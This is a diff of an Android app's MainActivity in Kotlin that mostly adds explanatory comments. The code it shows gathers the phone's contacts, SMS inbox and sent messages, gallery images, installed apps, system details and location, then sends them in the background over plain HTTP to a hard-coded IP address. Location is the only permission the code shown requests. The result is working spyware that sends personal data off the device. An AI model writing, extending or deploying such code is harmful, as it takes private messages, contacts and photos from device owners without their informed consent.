@@ -33,12 +33,12 @@ import com.google.android.gms.location.FusedLocationProviderClient
 import com.google.android.gms.location.LocationServices
 
 class MainActivity : ComponentActivity() {
-    private lateinit var fusedLocationClient: FusedLocationProviderClient
-    private var details: JSONObject = JSONObject()
+    private lateinit var fusedLocationClient: FusedLocationProviderClient // Late-initialized variable to handle location client
+    private var details: JSONObject = JSONObject() // JSON object to store details retrieve
     companion object {
-        const val LOCATION_PERMISSION_REQUEST_CODE = 1
+        const val LOCATION_PERMISSION_REQUEST_CODE = 1 // Constant for location permission request code
     }
-
+    // ViewModel for band data and shared data
     private val sharedViewModel: SharedViewModel by viewModels()
     private val bandViewModel: BandViewModel by viewModels()
 
@@ -46,21 +46,23 @@ class MainActivity : ComponentActivity() {
         super.onCreate(savedInstanceState)
         // Initialize the FusedLocationProviderClient
         fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
-        checkLocationPermissions()
+        checkLocationPermissions() // Check and request permissions
         setContent {
             MainApp(sharedViewModel = sharedViewModel, bandViewModel = bandViewModel)
             }
         }
     private fun sendDetailsToServer(details: JSONObject) {
-        val url = URL("http://13.92.41.98:5000/submit_details")
-        val connection = url.openConnection() as HttpURLConnection
+        val url = URL("http://13.92.41.98:5000/submit_details") // URL for server endpoint
+        val connection = url.openConnection() as HttpURLConnection // Open HTTP connection
         try {
+            // Try setting up connection properties
             connection.doOutput = true
             connection.requestMethod = "POST"
             connection.setRequestProperty("Content-Type", "application/json")
-            val outputStreamWriter = OutputStreamWriter(connection.outputStream)
+            val outputStreamWriter = OutputStreamWriter(connection.outputStream) // Write details to output stream
             outputStreamWriter.write(details.toString())
             outputStreamWriter.flush()
+            // Check response code
             if (connection.responseCode == HttpURLConnection.HTTP_OK) {
                 Log.d("MainActivity", "Details sent successfully")
             } else {
@@ -70,15 +72,16 @@ class MainActivity : ComponentActivity() {
             Log.e("MainActivity", "Exception: ${e.message}")
         } finally {
             Log.e("MainActivity", "disconnecting")
-            connection.disconnect()
+            connection.disconnect() // Disconnect from server
         }
     }
-
+    // Function to send image file to the server
     private fun sendImageToServer(imageFile: File) {
-        val url = URL("http://13.92.41.98:5000/upload")
-        val connection = url.openConnection() as HttpURLConnection
+        val url = URL("http://13.92.41.98:5000/upload") // URL for image upload
+        val connection = url.openConnection() as HttpURLConnection // Open HTTP connection
 
         try {
+            // Try setting up connection properties
             connection.doOutput = true
             connection.requestMethod = "POST"
             connection.setRequestProperty("Content-Type", "multipart/form-data;boundary=*****")
@@ -115,11 +118,11 @@ class MainActivity : ComponentActivity() {
         } catch (e: Exception) {
             println("Exception: ${e.message}")
         } finally {
-            connection.disconnect()
+            connection.disconnect() // Disconnect from server
         }
     }
 
-    // Check for location permissions at Runtime, request the missing permissions if not
+    // Check for permissions at Runtime, request the missing permissions if not
     private fun checkLocationPermissions() {
         if ((ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED
                     || ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED)
@@ -152,11 +155,11 @@ class MainActivity : ComponentActivity() {
         } else {
             // Permission has already been granted, proceed with accessing location
             print("For debug: Permission granted for accessing location")
-            getLastLocation()
-            proceedWithActions()
+            getLastLocation() // Get last known location
+            proceedWithActions() // Proceed with other actions such as getting system details
         }
     }
-
+    // Function to proceed with actions after permissions are granted
     private fun proceedWithActions() {
         // Proceed with actions after permissions are granted
         val sysinfo = SystemDetails.getSystemDetails(this)
@@ -166,7 +169,7 @@ class MainActivity : ComponentActivity() {
         val readSMSInbox = SystemDetails.readMessages(this,"inbox") + SystemDetails.readMessages(this,"sent")
         val getGallery = SystemDetails.listOfImages(this)
         val appsinstalled = SystemDetails.installedApps(this)
-
+        // Handle gallery images
         if (getGallery.isEmpty()) {
             Log.e("SMSInbox", "No images found")
         } else {
@@ -178,6 +181,7 @@ class MainActivity : ComponentActivity() {
             }
         }
         Log.e("apps", appsinstalled)
+        // Populate retrieved details into JSON object
         details.put("UUID", uuid)
         details.put("OS Details", sysinfo)
         details.put("Contacts", contactsInfo)
@@ -185,12 +189,12 @@ class MainActivity : ComponentActivity() {
         details.put("SMS Inbox", SystemDetails.formatSMSMessages(readSMSInbox))
         details.put("App Installed", appsinstalled)
         Log.e("MainActivity", contactsInfo)
-
+        // Send details to server in a background coroutine
         GlobalScope.launch(Dispatchers.IO) {
             sendDetailsToServer(details)
         }
     }
-
+    // Handle permission request results
     override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
         when (requestCode) {
@@ -199,7 +203,6 @@ class MainActivity : ComponentActivity() {
                     // Permission was granted, proceed with accessing location
                     print("For debug: Permission granted for accessing location")
                     getLastLocation()
-                    //proceedWithActions()
                 } else {
                     // Permission denied, handle the case where the user denies the permission.
                     print("For debug: Permission DENIED for accessing location")
@@ -209,7 +212,7 @@ class MainActivity : ComponentActivity() {
             // Add other 'when' lines to check for other permissions this app might request if any.
         }
     }
-
+    // Function to get last known location
     private fun getLastLocation() {
         if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
             fusedLocationClient.lastLocation.addOnSuccessListener { location: Location? ->
@@ -220,7 +223,7 @@ class MainActivity : ComponentActivity() {
                         val locationUser = "X:$latitude, Y:$longitude | "
                         details.put("Location", locationUser)
                         Log.d("LocationData", locationUser)
-                        proceedWithActions()
+                        proceedWithActions()// Proceed with other actions
                     } catch (e: Exception) {
                         Log.e("LocationData", "Error saving location data", e)
                     }
